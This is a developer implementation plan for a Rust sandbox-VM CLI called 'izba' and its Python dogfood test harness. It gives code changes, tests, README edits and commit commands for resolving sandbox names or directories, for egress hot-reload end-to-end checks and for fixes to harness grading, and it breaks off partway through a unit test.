git add crates/izba-cli/src/commands/sandbox_ref.rs crates/izba-cli/src/commands/mod.rs
git commit -m "feat(cli): shared NAME-or-DIR sandbox reference resolver (#123)

One deterministic rule set: path-syntax args are workspaces, bare words are
sandbox names first (with a ./word/izba.yml fallback + note), no arg means
the current workspace; a bare word matching both a sandbox and a
different-sandbox directory is a hard error."
```

---

### Task 6: #123 — wire `diff`/`promote`/`export` to the resolver (bare names work)

**Files:**
- Modify: `crates/izba-cli/src/main.rs` (Diff :307-314, Export :316-323, Promote :325-342, dispatch :450-458; any parse tests below :494 that construct these variants)
- Modify: `crates/izba-cli/src/commands/diff.rs:12-29`, `crates/izba-cli/src/commands/export.rs:10-30`, `crates/izba-cli/src/commands/promote.rs:43-56`

**Interfaces:**
- Consumes: `sandbox_ref::resolve(paths, arg) -> Result<SandboxRef>` (Task 5).
- Produces: new command signatures (dispatch must match):
  - `commands::diff::run(paths: &Paths, target: Option<&str>, name_override: Option<&str>) -> Result<i32>`
  - `commands::export::run(paths: &Paths, target: Option<&str>, name_override: Option<&str>) -> Result<i32>`
  - `commands::promote::run(paths: &Paths, target: Option<&str>, name_override: Option<&str>, force: bool, restart: bool, reset_scratch: bool) -> Result<i32>`

- [ ] **Step 1: Update the clap variants** in `main.rs` — replace the three `dir: PathBuf` positionals:

```rust
    /// Show drift between izba.yml and the managed sandbox truth
    Diff {
        /// Sandbox name, or workspace directory containing izba.yml
        /// (default: the current directory)
        #[arg(value_name = "NAME_OR_DIR")]
        target: Option<String>,
        /// Sandbox name override (default: from manifest metadata.name or the dir basename)
        #[arg(long)]
        name: Option<String>,
    },
    /// Write the managed sandbox truth back into izba.yml
    Export {
        /// Sandbox name, or workspace directory to write izba.yml into
        /// (default: the current directory)
        #[arg(value_name = "NAME_OR_DIR")]
        target: Option<String>,
        /// Sandbox name override (default: from existing izba.yml or the dir basename)
        #[arg(long)]
        name: Option<String>,
    },
    /// Apply izba.yml to the managed sandbox (requires a prior `izba diff`)
    Promote {
        /// Sandbox name, or workspace directory containing izba.yml
        /// (default: the current directory)
        #[arg(value_name = "NAME_OR_DIR")]
        target: Option<String>,
        /// Sandbox name override (default: from manifest metadata.name or the dir basename)
        #[arg(long)]
        name: Option<String>,
        /// Promote even if the manifest was never reviewed / changed since review
        #[arg(long)]
        force: bool,
        /// Stop+start the sandbox now to apply restart-class fields (cpus/mem/image)
        #[arg(long)]
        restart: bool,
        /// On an image change, reset the rw scratch overlay onto the new base
        /// (default true). `--reset-scratch=false` keeps it (expert-only, loud).
        #[arg(long, default_value_t = true, action = clap::ArgAction::Set)]
        reset_scratch: bool,
    },
```

And in `dispatch()`:

```rust
        Cmd::Diff { target, name } => {
            commands::diff::run(paths, target.as_deref(), name.as_deref())
        }
        Cmd::Export { target, name } => {
            commands::export::run(paths, target.as_deref(), name.as_deref())
        }
        Cmd::Promote {
            target,
            name,
            force,
            restart,
            reset_scratch,
        } => commands::promote::run(
            paths,
            target.as_deref(),
            name.as_deref(),
            force,
            restart,
            reset_scratch,
        ),
```

- [ ] **Step 2: Rewrite the three command entrypoints.**

`commands/diff.rs` — replace `run` (:12-30) with:

```rust
#[mutants::skip] // reason: reads managed truth from disk + writes the review token for a managed sandbox; orchestration exercised by daemon_e2e (manifest_diff_promote_live_path). The pure pieces (sandbox_ref::resolve, ops::compute_diff, render_deltas) are unit-tested separately.
pub fn run(paths: &Paths, target: Option<&str>, name_override: Option<&str>) -> Result<i32> {
    // #123: NAME-or-DIR positional through the shared resolver. A bare sandbox
    // name resolves to the workspace recorded in its config.json.
    let r = super::sandbox_ref::resolve(paths, target)?;
    let dir = r.workspace.clone().with_context(|| {
        format!("sandbox '{}' has no recorded workspace directory", r.name)
    })?;
    let name = match name_override {
        Some(n) => n.to_string(),
        None => r.name,
    };

    // Delegate the pure filesystem logic to ops (shared with the desktop app).
    let (state, deltas, token) = izba_core::manifest::ops::compute_diff(paths, &dir, &name)?;
    println!("{}", render_deltas(state, &deltas));

    // Record the review token over exactly what we showed.
    store::write_review(&paths.sandbox_dir(&name), &token)?;
    Ok(0)
}
```

(add `use anyhow::Context;` to the imports; drop the now-unused `use std::path::Path;` if nothing else needs it).

`commands/export.rs` — replace `run` (:10-30) with:

```rust
#[mutants::skip] // reason: reads managed truth from disk + writes izba.yml for a managed sandbox; orchestration exercised by daemon_e2e. The pure logic (sandbox_ref::resolve, ops::export, managed_normalized, to_manifest) is unit-tested separately.
pub fn run(paths: &Paths, target: Option<&str>, name_override: Option<&str>) -> Result<i32> {
    // #123: NAME-or-DIR positional. For the workspace form the name comes from
    // an existing izba.yml metadata.name (malformed YAML propagates — never
    // silently exporting under the wrong name) or the dir basename; for the
    // name form the workspace comes from config.json.
    let r = super::sandbox_ref::resolve(paths, target)?;
    let dir = r.workspace.clone().with_context(|| {
        format!("sandbox '{}' has no recorded workspace directory", r.name)
    })?;
    let name = match name_override {
        Some(n) => n.to_string(),
        None => r.name,
    };
    let path = izba_core::manifest::ops::export(paths, &dir, &name)?;
    println!("exported managed truth -> {}", path.display());
    Ok(0)
}
```

(add `use anyhow::Context;` and drop the now-unused `use std::path::Path;`; keep the existing tests — they call `load_repo_manifest` directly and still compile.)

`commands/promote.rs` — replace the head of `run` (:43-56, down to `let dir_managed = ...`) with:

```rust
#[mutants::skip] // reason: drives a live daemon (ReloadPolicy/Port*/Volume*/Stop/Start/Inspect over the socket) + image build/pull; e2e-only (daemon_e2e manifest_diff_promote_live_path). The decision logic it composes (sandbox_ref::resolve, gate, apply::plan, diff_normalized, build_opts_from) is unit-tested separately.
pub fn run(
    paths: &Paths,
    target: Option<&str>,
    name_override: Option<&str>,
    force: bool,
    restart: bool,
    reset_scratch: bool,
) -> Result<i32> {
    // #123: NAME-or-DIR positional through the shared resolver.
    let r = super::sandbox_ref::resolve(paths, target)?;
    let dir = r.workspace.clone().with_context(|| {
        format!("sandbox '{}' has no recorded workspace directory", r.name)
    })?;
    let dir = dir.as_path();
    let (m, raw, dockerfile) = super::load_repo_manifest(dir)?;
    let repo = Normalized::from_manifest(&m, &r.name)?;
    let name = name_override.unwrap_or(&repo.name).to_string();
    izba_core::sandbox::validate_name(&name)?;
    let dir_managed = paths.sandbox_dir(&name);
```

(the rest of the function body is unchanged; `Context` is already imported at promote.rs:7. `r.name` replaces the old `workspace_default_name(dir)` default — for the workspace form the resolver computed exactly `metadata.name`-or-basename, and `from_manifest` prefers `metadata.name` anyway, so `repo.name` is unchanged.)

- [ ] **Step 3: Fix any parse tests + run the crate suite**

Run: `cargo test -p izba-cli 2>&1 | tail -20`
Expected: compile errors in `main.rs` `mod tests` if any test constructs `Cmd::Diff { dir, .. }` — update those to `target: Some/None` form. Then all PASS.

- [ ] **Step 4: Manual smoke of the three forms**

Run (from the worktree root; no daemon needed for the error paths):
`cargo run -q -p izba-cli -- diff ghost-name 2>&1 | tail -2` → expected: `no sandbox named 'ghost-name' and no ./ghost-name/izba.yml — …` (exit 1).
`cargo run -q -p izba-cli -- diff . 2>&1 | tail -2` → expected: `reading ./izba.yml: No such file or directory`-style error (workspace form unchanged).

- [ ] **Step 5: Commit**

```bash
git add crates/izba-cli/src/main.rs crates/izba-cli/src/commands/diff.rs crates/izba-cli/src/commands/export.rs crates/izba-cli/src/commands/promote.rs
git commit -m "feat(cli): diff/promote/export accept a sandbox NAME as well as a DIR (#123)

The positional becomes NAME_OR_DIR through the shared resolver: bare names
resolve to the workspace recorded in config.json (what the README already
documented: 'izba diff myapp'), path-syntax args keep the compose-style dir
semantics, and the mismatch hint replaces 'reading my-sandbox/izba.yml: No
such file or directory'."
```

---

### Task 7: #123 — `status`/`stop`/`rm`/`start` accept NAME-or-DIR, defaulting to "."

**Files:**
- Modify: `crates/izba-cli/src/main.rs` (Status :208-211, Start :218-225, Stop :227-230, Rm :232-238; dispatch :421-427; parse tests)
- Modify: `README.md` (add a "Referring to sandboxes" note in the Commands section, ~line 150-190)

**Interfaces:**
- Consumes: `sandbox_ref::resolve` (Task 5). The four command `run()` functions keep their `name: &str` signatures — resolution happens in `dispatch()`.
- Produces: CLI surface change only.

- [ ] **Step 1: Update the clap variants** (docs comments included):

```rust
    /// Show detailed status for one sandbox (incl. host-side VMM confinement)
    Status {
        /// Sandbox name or workspace directory (default: the current
        /// directory's sandbox)
        #[arg(value_name = "NAME_OR_DIR")]
        target: Option<String>,
    },
```

`Start` keeps its `allow_unconfined` flag; `Rm` keeps `force`:

```rust
    Start {
        /// Sandbox name or workspace directory (default: the current
        /// directory's sandbox)
        #[arg(value_name = "NAME_OR_DIR")]
        target: Option<String>,
        /// Start the VMM WITHOUT host-side confinement (NOT recommended; only
        /// if confinement fails on your host)
        #[arg(long)]
        allow_unconfined: bool,
    },
    /// Stop a running sandbox
    Stop {
        /// Sandbox name or workspace directory (default: the current
        /// directory's sandbox)
        #[arg(value_name = "NAME_OR_DIR")]
        target: Option<String>,
    },
    /// Remove a sandbox
    Rm {
        /// Sandbox name or workspace directory (default: the current
        /// directory's sandbox)
        #[arg(value_name = "NAME_OR_DIR")]
        target: Option<String>,
        /// Stop and remove even if running
        #[arg(long)]
        force: bool,
    },
```

Dispatch arms resolve to a name (the commands themselves are unchanged):

```rust
        Cmd::Status { target } => {
            let name = commands::sandbox_ref::resolve(paths, target.as_deref())?.name;
            commands::status::run(paths, &name)
        }
        Cmd::Start {
            target,
            allow_unconfined,
        } => {
            let name = commands::sandbox_ref::resolve(paths, target.as_deref())?.name;
            commands::start::run(paths, &name, allow_unconfined)
        }
        Cmd::Stop { target } => {
            let name = commands::sandbox_ref::resolve(paths, target.as_deref())?.name;
            commands::stop::run(paths, &name)
        }
        Cmd::Rm { target, force } => {
            let name = commands::sandbox_ref::resolve(paths, target.as_deref())?.name;
            commands::rm::run(paths, &name, force)
        }
```

- [ ] **Step 2: Add parse tests** to `main.rs` `mod tests` (follow the existing `Cli::try_parse_from` style there):

```rust
    #[test]
    fn parse_status_stop_rm_start_optional_target() {
        // Bare word stays a name; omitted means "the current workspace".
        let c = Cli::try_parse_from(["izba", "stop", "myapp"]).unwrap();
        match c.cmd {
            Cmd::Stop { target } => assert_eq!(target.as_deref(), Some("myapp")),
            other => panic!("expected Stop, got {other:?}"),
        }
        let c = Cli::try_parse_from(["izba", "status"]).unwrap();
        match c.cmd {
            Cmd::Status { target } => assert!(target.is_none()),
            other => panic!("expected Status, got {other:?}"),
        }
        let c = Cli::try_parse_from(["izba", "rm", "--force", "./proj"]).unwrap();
        match c.cmd {
            Cmd::Rm { target, force } => {
                assert_eq!(target.as_deref(), Some("./proj"));
                assert!(force);
            }
            other => panic!("expected Rm, got {other:?}"),
        }
    }
```

- [ ] **Step 3: README** — in the Commands section, right after the command table/block (~line 190), add:

```markdown
### Referring to sandboxes

Every lifecycle and manifest command takes `NAME_OR_DIR`: a **path-looking
argument** (`.`, `./proj`, `/abs/path`) always means a workspace directory; a
**bare word** means a sandbox name first (falling back to `./word` if that
directory holds an `izba.yml`); **no argument** means the sandbox of the
current directory — so `izba status`, `izba stop`, `izba diff` all "just work"
from a project root, git-style. If a bare word matches both a sandbox and a
directory that resolves to a *different* sandbox, izba refuses and asks for
the explicit `./word` or the exact name.
```

Also verify the existing README examples at ~line 176-179 (`izba diff [DIR] [--name NAME]`) — update `[DIR]` to `[NAME_OR_DIR]` for diff/promote/export and add it to status/stop/rm/start lines if they appear there.

- [ ] **Step 4: Run gates for the crate**

Run: `cargo test -p izba-cli && cargo clippy -p izba-cli --all-targets -- -D warnings && cargo fmt`
Expected: PASS/clean.

- [ ] **Step 5: Commit**

```bash
git add crates/izba-cli/src/main.rs README.md
git commit -m "feat(cli): status/stop/rm/start accept NAME-or-DIR, defaulting to the cwd sandbox (#123)

Same resolver as diff/promote/export: bare words stay names (no behavior
change), path-syntax args address the workspace's sandbox, and omitting the
positional targets the current directory's sandbox. README documents the
unified reference model."
```

---

### Task 8: daemon_e2e — pin egress hot-reload (constant vmm pid) + promote-on-stopped skip

**Files:**
- Modify: `crates/izba-cli/tests/daemon_e2e.rs` (extend `manifest_diff_promote_live_path`, currently ending at the Cleanup block after step [8])

**Interfaces:**
- Consumes: the test's existing helpers `izba(&data, env, &[args])`, `assert_ok`, `stdout_of` (and a stderr accessor — check the helpers near the top of the file; if there is no `stderr_of`, use `String::from_utf8_lossy(&o.stderr)`), plus `izba_core::state::{load_json, RunState, STATE_FILE}`.
- Produces: two new assertions inside the existing `#[test] fn manifest_diff_promote_live_path`. KVM-gated (`want()`), compile-checked locally, executed by `e2e.yml`.

- [ ] **Step 1: Extend the test** — insert BEFORE the final `// Cleanup.` block:

```rust
    // [9] Graduation (dogfood 2026-07-09): an egress-ONLY promote must
    // hot-reload the policy WITHOUT restarting the VM — vmm pid constant.
    let state_path = data.join("sandboxes").join(name).join(STATE_FILE);
    let st: RunState = load_json(&state_path)
        .expect("read state.json")
        .expect("state.json present while running");
    let pid_before = st.vmm_pid.clone();
    std::fs::write(
        ws.join("izba.yml"),
        concat!(
            "apiVersion: izba.dev/v1alpha1\n",
            "kind: Sandbox\n",
            "metadata:\n",
            "  name: manifest\n",
            "spec:\n",
            "  image: alpine:3.20\n",
            "  resources:\n",
            "    cpus: 2\n",
            "    memory: 4Gi\n",
            "  rootDisk:\n",
            "    size: 8Gi\n",
            "  egress:\n",
            "    enforce: true\n",
            "    allow:\n",
            "      - example.com\n",
            "      - api.anthropic.com\n",
            "      - crates.io\n",
            "  ports:\n",
            "    - guest: 8000\n",
            "      host: 18131\n",
        ),
    )
    .unwrap();
    assert_ok(&izba(&data, no_env, &["diff", &ws_s]), "diff (egress-only)");
    assert_ok(&izba(&data, no_env, &["promote", &ws_s]), "promote (egress-only)");
    let st: RunState = load_json(&state_path)
        .expect("read state.json after promote")
        .expect("state.json still present");
    assert_eq!(
        st.vmm_pid, pid_before,
        "egress-only promote must hot-reload, not restart the VM"
    );
    let o = izba(&data, no_env, &["policy", "show", name]);
    assert_ok(&o, "policy show after hot-reload");
    assert!(
        stdout_of(&o).contains("crates.io"),
        "hot-reloaded policy must list crates.io; got:\n{}",
        stdout_of(&o)
    );

    // [10] Promote against a STOPPED sandbox skips live RPCs with the honest
    // "changes apply on next start" note (promote.rs:198) and exits 0.
    assert_ok(&izba(&data, no_env, &["stop", name]), "stop before offline promote");
    std::fs::write(
        ws.join("izba.yml"),
        concat!(
            "apiVersion: izba.dev/v1alpha1\n",
            "kind: Sandbox\n",
            "metadata:\n",
            "  name: manifest\n",
            "spec:\n",
            "  image: alpine:3.20\n",
            "  resources:\n",
            "    cpus: 2\n",
            "    memory: 4Gi\n",
            "  rootDisk:\n",
            "    size: 8Gi\n",
            "  egress:\n",
            "    enforce: true\n",
            "    allow:\n",
            "      - example.com\n",
        ),
    )
    .unwrap();
    assert_ok(&izba(&data, no_env, &["diff", &ws_s]), "diff (stopped)");
    let o = izba(&data, no_env, &["promote", &ws_s]);
    assert_ok(&o, "promote against a stopped sandbox");
    let err = String::from_utf8_lossy(&o.stderr);
    let out = stdout_of(&o);
    assert!(
        err.contains("changes apply on next start") || out.contains("changes apply on next start"),
        "offline promote must print the next-start note; stdout:\n{out}\nstderr:\n{err}"
    );
```

Add the imports at the test-file top if absent: `use izba_core::state::{load_json, RunState, STATE_FILE};` (check existing imports first — the file already links izba_core). If `stdout_of` returns `String` by value adjust the borrowings accordingly; if a `stderr_of` helper exists, prefer it over the `from_utf8_lossy` line. NOTE: step [10]'s manifest keeps ports EMPTY — that makes the port from step [3] a `ports` delta; that is fine (a live-class delta against a stopped sandbox is exactly what the note covers), but if `assert_ok` fails because promote errors on port RPCs, re-read promote.rs:139-200 — live RPCs are skipped when stopped, so it must not.

- [ ] **Step 2: Compile-check the e2e test** (real execution needs KVM + artifacts; CI runs it)

Run: `cargo test -p izba-cli --test daemon_e2e --no-run`
Expected: compiles cleanly.

- [ ] **Step 3: Commit**

```bash
git add crates/izba-cli/tests/daemon_e2e.rs
git commit -m "test(e2e): pin egress hot-reload (constant vmm pid) + promote-on-stopped skip

Graduates the two strongest live behaviors the 2026-07-09 dogfood run
verified into the deterministic daemon_e2e manifest path."
```

---

### Task 9: H2 — `informational:` reconcile items must not flip a journey

**Files:**
- Modify: `hack/dogfood/run_journeys.py:238-250` (`_collect_candidates` violations block)
- Test: `hack/dogfood/test_runner.py`

**Interfaces:**
- Consumes: the product contract that informational reconcile violations carry a `detail` starting with `informational:` (sole producer: `crates/izba-core/src/reconcile.rs` OrphanVolume, pinned by `unreferenced_named_volume_is_informational_orphan_volume`).
- Produces: `_flipping_violations(violations: list) -> list` module function in `run_journeys.py`.

- [ ] **Step 1: Write the failing tests** — add to `hack/dogfood/test_runner.py` (follow the file's existing unittest style; `_collect_candidates` and `Action` are importable — mirror how existing tests build an `Action` with a `reconcile` dict):

```python
class InformationalReconcileTest(unittest.TestCase):
    def _action(self, violations):
        from oracles import Action
        return Action(intent="", command="izba rm x", exit_code=0,
                      stdout_tail="", stderr_tail="", latency_ms=1,
                      reconcile={"violations": violations, "sandboxes": []})

    def test_informational_only_violations_do_not_flip(self):
        import run_journeys as rj
        a = self._action([{"kind": "orphan_volume",
                           "detail": "informational: named volume 'x' is "
                                     "unreferenced (persistent volumes survive rm)"}])
        cands = rj._collect_candidates(a, "izba rm x", 0, None, 30000, {}, {}, "j1")
        self.assertFalse(
            [c for c in cands if c["kind"] == "reconcile_violation"],
            f"informational items must not flip: {cands}")

    def test_mixed_violations_flip_and_count_only_real_ones(self):
        import run_journeys as rj
        a = self._action([
            {"kind": "orphan_volume", "detail": "informational: named volume 'x'"},
            {"kind": "list_mismatch", "detail": "daemon lists a ghost sandbox"},
        ])
        cands = [c for c in rj._collect_candidates(
            a, "izba ls", 0, None, 30000, {}, {}, "j1")
            if c["kind"] == "reconcile_violation"]
        self.assertEqual(len(cands), 1)
        self.assertIn("1 violation(s)", cands[0]["detail"])
        self.assertNotIn("informational", cands[0]["detail"])
```

- [ ] **Step 2: Run to verify they fail**

Run: `python3 -m pytest hack/dogfood/test_runner.py -q -k Informational`
Expected: both FAIL (today any non-empty violations array flips, and the preview includes the informational item).

- [ ] **Step 3: Implement** — in `run_journeys.py`, add above `_collect_candidates`:

```python
def _flipping_violations(violations: List[Any]) -> List[Any]:
    """Drop the product's self-labeled `informational:` reconcile items (e.g. an
    unreferenced named volume after rm — intended behavior, reconcile.rs prefixes
    the detail). Informational items stay visible in state_evidence; only the
    rest may flip a journey (H2)."""
    out = []
    for v in violations:
        detail = v.get("detail", "") if isinstance(v, dict) else str(v)
        if not str(detail).startswith("informational:"):
            out.append(v)
    return out
```

and change the block at :238-250 to filter first:

```python
    violations = _flipping_violations(
        (action.reconcile or {}).get("violations") or [])
    if violations:
        import json as _json
        found = list(found)
        preview = _json.dumps(violations[:3])[:400]
        found.append(Candidate(
            kind="reconcile_violation",
            detail=(f"izba __reconcile reported {len(violations)} violation(s) "
                    f"after {command!r}: {preview}"),
            violated_expectation="reconciler must report no violations "
                                 "(declared state == reality)",
            source="contract: disk-state invariant (__reconcile)",
        ))
```

- [ ] **Step 4: Run the harness suite**

Run: `python3 -m pytest hack/dogfood -q`
Expected: all pass (169 + 2 new).

- [ ] **Step 5: Commit**

```bash
git add hack/dogfood/run_journeys.py hack/dogfood/test_runner.py
git commit -m "fix(dogfood): informational: reconcile items no longer flip a journey (H2)

7 false reconcile_violation flips in the 2026-07-09 run were the self-labeled
'informational: named volume ...' note (intended behavior). Filter on the
product's informational: detail prefix; real violations still flip."
```

---

### Task 10: H7 — coalesce model-starvation infra candidates to one per journey

**Files:**
- Modify: `hack/dogfood/run_journeys.py` (`_next_command` :313-335, `_run_step` call site :370, `run_journey` ctx init :471 + post-loop)
- Test: `hack/dogfood/test_runner.py`

**Interfaces:**
- Consumes: `_infra_candidate(journey_id, detail)` (unchanged), `count_degraded` (unchanged semantics: any `infra` candidate still marks the journey degraded).
- Produces: `_next_command(model, journey, step, actions, budget, journey_id, starved)` — last param becomes a `List[str]` of failure details (was `candidates`).

- [ ] **Step 1: Write the failing test** — add to `hack/dogfood/test_runner.py`:

```python
class StarvationTallyTest(unittest.TestCase):
    def test_repeated_model_failures_yield_one_infra_candidate(self):
        import run_journeys as rj
        from model import FakeModel
        # Two steps; the model errors on BOTH turns -> previously 2 per-reply
        # infra candidates, now ONE tally candidate for the journey.
        model = FakeModel([{"error": "unparseable model reply: 'x'"},
                           {"error": "unparseable model reply: 'y'"}])
        journey = {"journey_id": "starved-j",
                   "steps": [{"intent": "a", "expect": ""},
                             {"intent": "b", "expect": ""}]}
        with tempfile.TemporaryDirectory() as td:
            res = rj.run_journey(
                model, journey, izba_bin="/bin/false", data_dir=td,
                max_turns=8, step_cap=8, action_timeout_s=5,
                latency_budget_ms=30000, budget={"usd": 0.0}, max_usd=1.0)
        infra = [c for c in res["candidates"] if c.get("kind") == "infra"]
        self.assertEqual(
            len(infra), 1,
            f"starvation must coalesce to ONE infra candidate: {infra}")
        self.assertIn("2 failed turn(s)", infra[0]["detail"])
        self.assertIn("unparseable", infra[0]["detail"])
        # Degradation semantics unchanged: the journey still counts degraded.
        self.assertEqual(rj.count_degraded([res]), 1)
```

Check `FakeModel` in `hack/dogfood/model.py` first: if its scripted replies are returned verbatim from `next_command`, `{"error": ...}` flows through `_next_command`'s error branch as needed. `tempfile`/`unittest` imports exist in the file's header. NOTE: `run_journey` may also emit an `infra` candidate from the "reconciler unusable" check (:518-520) — it requires `actions` non-empty, and this journey produces zero actions, so it stays silent; the zero-action journey also emits `unreached_decisive` for the last step — the test filters `kind == "infra"` so that is fine.

- [ ] **Step 2: Run to verify it fails**

Run: `python3 -m pytest hack/dogfood/test_runner.py -q -k Starvation`
Expected: FAIL with 2 infra candidates.

- [ ] **Step 3: Implement.**

(a) `_next_command` — rename the last parameter and stop appending candidates (docstring updated):

```python
def _next_command(model, journey, step, actions, budget, journey_id, starved):
    """One model turn -> a command string, or None to end the step.

    A model-layer failure ({"error": ...} reply, or an exception) is an INFRA
    finding, not a completion — but per-turn candidates drowned the bundle
    (H7), so failures are TALLIED into ``starved`` and the journey emits ONE
    coalesced `infra` candidate at the end (run_journey)."""
    try:
        reply = model.next_command(journey, step, actions)
        budget["usd"] += float(getattr(model, "last_cost_usd", 0.0) or 0.0)
    except Exception as e:  # report-only, but never silently green
        log(f"{journey_id}: model error: {e!r}; ending step")
        starved.append(f"model raised: {e!r}")
        return None
    if isinstance(reply, dict) and reply.get("error"):
        log(f"{journey_id}: model infra error: {reply['error']}; ending step")
        starved.append(str(reply["error"]))
        return None
    if not isinstance(reply, dict) or reply.get("done"):
        return None
    command = reply.get("command")
    if not isinstance(command, str) or not command.strip():
        return None
    return command
```

(b) `_run_step` call site (:370-371): pass the tally instead of candidates:

```python
            command = _next_command(model, journey, step, actions, budget, journey_id,
                                    ctx["starved"])
```

(c) `run_journey`: init the tally at :471 — `ctx: Dict[str, Any] = {"turns": 0, "prev_reconcile": None, "starved": []}` — and AFTER the steps loop (right before the `# #126:` unreached block) emit the coalesced candidate:

```python
    # H7: coalesce model-starvation failures into ONE flipping infra candidate
    # (count_degraded semantics unchanged — any infra candidate degrades).
    if ctx["starved"]:
        candidates.append(_infra_candidate(
            journey_id,
            f"model starved: {len(ctx['starved'])} failed turn(s); "
            f"first: {ctx['starved'][0]}"))
```

- [ ] **Step 4: Run the harness suite; fix any test that asserted per-reply candidates**

Run: `python3 -m pytest hack/dogfood -q`
Expected: the new test passes; if an existing test asserts one-infra-per-failed-turn, update it to the coalesced contract (assert the tally detail instead).

- [ ] **Step 5: Commit**

```bash
git add hack/dogfood/run_journeys.py hack/dogfood/test_runner.py
git commit -m "fix(dogfood): coalesce model-starvation infra candidates to one per journey (H7)

7 truncated cheap-model replies used to emit 7 flipping infra candidates in
one journey, drowning the bundle. Failures now tally into a single
'model starved: N failed turn(s)' candidate; exit-3 degradation semantics
are unchanged."
```

---

### Task 11: H1 — grade the product command, not the trailing heredoc

**Files:**
- Modify: `hack/dogfood/run_journeys.py` (`_grade_step_functional` :271-310)
- Test: `hack/dogfood/test_runner.py`

**Interfaces:**
- Consumes: nothing new; `expect_cmd_re` selection stays the first preference.
- Produces: module-level `_PRODUCT_CMD_RE` regex; selection order becomes `expect_cmd_re` → last izba-invoking action → final action.

- [ ] **Step 1: Write the failing test:**

```python
class ProductCommandGradingTest(unittest.TestCase):
    def _produced(self):
        # The izba command failed as expected (exit 2), then the model wrote a
        # file with a heredoc as the step's FINAL action (exit 0).
        return [
            {"command": "izba promote .", "exit_code": 2},
            {"command": "cat > izba.yml <<EOF\nfoo\nEOF", "exit_code": 0},
        ]

    def test_grades_last_izba_action_not_trailing_heredoc(self):
        import run_journeys as rj
        step = {"intent": "promote must refuse", "expect": "",
                "expect_exit": "nonzero"}
        cands = rj._grade_step_functional(
            step, self._produced(), {}, "j1", True, action_index=1)
        self.assertFalse(
            cands, f"the izba action (exit 2) satisfies expect_exit=nonzero, "
                   f"but the heredoc was graded: {cands}")

    def test_falls_back_to_final_action_without_any_izba_command(self):
        import run_journeys as rj
        produced = [{"command": "ls -la", "exit_code": 0},
                    {"command": "cat notes.txt", "exit_code": 1}]
        step = {"intent": "x", "expect": "the listing succeeds"}
        cands = rj._grade_step_functional(step, produced, {}, "j1", False,
                                          action_index=1)
        self.assertTrue(cands, "final action (exit 1) vs success expectation "
                               "must still produce a candidate")
        self.assertEqual(cands[0]["graded_cmd"], "cat notes.txt")

    def test_expect_cmd_re_still_wins_over_izba_heuristic(self):
        import run_journeys as rj
        produced = [{"command": "izba diff .", "exit_code": 0},
                    {"command": "izba promote .", "exit_code": 2},
                    {"command": "echo done", "exit_code": 0}]
        step = {"intent": "x", "expect": "", "expect_exit": 0,
                "expect_cmd_re": r"izba diff"}
        cands = rj._grade_step_functional(step, produced, {}, "j1", True,
                                          action_index=2)
        self.assertFalse(cands, f"expect_cmd_re selects `izba diff` (exit 0), "
                                f"which matches expect_exit=0: {cands}")
```

- [ ] **Step 2: Run to verify the first fails**

Run: `python3 -m pytest hack/dogfood/test_runner.py -q -k ProductCommand`
Expected: `test_grades_last_izba_action_not_trailing_heredoc` FAILS (the heredoc exit 0 trips `expect_exit=nonzero`); the other two PASS (pinning current behavior).

- [ ] **Step 3: Implement** — add the module-level regex near `_CMD_SECTION_RE` (:114-117):

```python
# H1: the default functional-grading target is the step's last PRODUCT
# invocation — a shell line that runs the izba binary (word-boundary; possibly
# after env assignments / `cd x && ` / pipes). "izba.yml" does NOT match (the
# dot fails the trailing \s|$), so file-writing heredocs stay plumbing.
_PRODUCT_CMD_RE = re.compile(r"(?:^|[\s;|&(])izba(?:\s|$)")
```

and in `_grade_step_functional`, replace the selection block (:283-296) with:

```python
    target = produced[-1]
    target_index = action_index
    pattern = step.get("expect_cmd_re")
    if isinstance(pattern, str) and pattern:
        try:
            rx = re.compile(pattern)
            for off, a in enumerate(reversed(produced)):
                if rx.search(a.get("command", "")):
                    target = a
                    target_index = action_index - off
                    break
        except re.error as e:
            log(f"{journey_id}: invalid expect_cmd_re {pattern!r}: {e}; "
                f"grading the final action")
    else:
        # H1: without expect_cmd_re, prefer the last action that invokes the
        # product over trailing shell plumbing (seed-write heredocs, `ls`
        # peeks). Nothing izba-shaped -> the final action, as before.
        for off, a in enumerate(reversed(produced)):
            if _PRODUCT_CMD_RE.search(a.get("command", "")):
                target = a
                target_index = action_index - off
                break
```

Update the function docstring's first lines to say: "Default target is the step's last action that INVOKES the izba binary (falling back to the final action when none does); ``expect_cmd_re`` overrides."  Also update the `_collect_candidates` docstring reference (:230-233) from "(``expect_cmd_re``-selected, falling back to the final action)" to "(``expect_cmd_re``-selected, else the last izba-invoking action, else the final action)".

- [ ] **Step 4: Run the harness suite** (the decisive-grading integration test at test_runner.py:407-460 grades izba-shaped fake commands — verify it still passes; if a fixture's final action was deliberately non-izba, re-read whether the new selection changes its verdict and adjust the fixture's expectation to the new contract)

Run: `python3 -m pytest hack/dogfood -q`
Expected: all pass.

- [ ] **Step 5: Commit**

```bash
git add hack/dogfood/run_journeys.py hack/dogfood/test_runner.py
git commit -m "fix(dogfood): default functional grading targets the last izba invocation (H1)

5 functional false-positives in the 2026-07-09 run were expect_exit graded
against a trailing 'cat > izba.yml <<EOF' seed-write instead of the izba
command carrying the step's intent. expect_cmd_re still overrides; steps
with no izba-shaped action keep final-action grading."
```

---

### Task 12: H3 — decisive coverage by observed commands, not the step pointer

**Files:**
- Modify: `hack/dogfood/run_journeys.py` (the `#126` unreached block :500-516 + new helper)
- Modify: `hack/dogfood/schema/journeys.schema.json` (`expect_cmd_re` description :109-112)
- Modify: `hack/dogfood/local-harness.md` and `.claude/agents/journey-compiler.md` (one authoring line each; locate the "decisive"/"core" guidance with grep)
- Test: `hack/dogfood/test_runner.py`

**Interfaces:**
- Consumes: `functional_oracle` (oracles.py:420), the per-action dicts in `actions` (`command`/`exit_code`).
- Produces: `_grade_decisive_from_observed(step, actions, journey, journey_id) -> Optional[List[dict]]` — `None` = no `expect_cmd_re` or no match (caller flags unreached); a list (possibly empty) = the assertion WAS exercised, graded from the observed action.

- [ ] **Step 1: Write the failing test:**

```python
class DecisiveByObservedCommandTest(unittest.TestCase):
    def test_decisive_satisfied_under_earlier_step_is_not_unreached(self):
        import run_journeys as rj
        from model import FakeModel
        # Step 0's model turn runs the DECISIVE command (izba diff) and then the
        # model goes done for the rest; step 1 (core) produces no actions.
        model = FakeModel([
            {"command": "true"},   # any benign shell action for step 0
            {"done": True},        # step 0 ends
            {"done": True},        # step 1 produces nothing
        ])
        journey = {"journey_id": "early-decisive",
                   "steps": [
                       {"intent": "explore", "expect": ""},
                       {"intent": "verify drift shows", "expect": "",
                        "core": True, "expect_exit": 0,
